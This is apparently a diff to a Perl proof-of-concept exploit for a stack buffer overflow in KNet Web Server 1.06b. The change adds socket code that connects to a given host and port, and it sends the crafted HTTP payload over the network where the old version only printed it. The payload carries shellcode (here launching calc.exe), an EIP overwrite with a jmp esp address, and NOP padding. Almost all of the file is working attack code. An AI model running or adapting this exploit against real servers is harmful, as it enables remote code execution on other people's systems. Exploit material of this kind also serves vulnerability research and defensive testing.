@@ -6,6 +6,13 @@
 # Version: 1.06b
 # Tested on: WinXP SP3
 
+use IO::Socket::INET;
+$host = shift;
+$port = shift;
+print "KNet Web Server stack corruption BoF PoC - Wireghoul - http://www.justanotherhacker.com\n";
+die "Usage $0 <host> <port>\n" unless $host && $port;
+$sock = IO::Socket::INET->new("$host:$port") or die "Unable to connect to $host:$port\n";
+
 # Shellcode for calc.exe
 $shellcode=
 "\x89\xe2\xda\xd5\xd9\x72\xf4\x5d\x55\x59\x49\x49\x49\x49" .
@@ -50,4 +57,4 @@ $payload.= "\x53\x93\x42\x7e"; #Overwrite EIP with jmp esp
 $payload.="\x90\x90\x90\x90\xE9\xF4\xFC\xFF\xFF"; #stack padding + BP + Near jmp-300
 $payload.=" / HTTP/1.0\r\n\r\n"; # Needs to be a valid HTTP request
 
-print $payload;
+print $sock $payload;
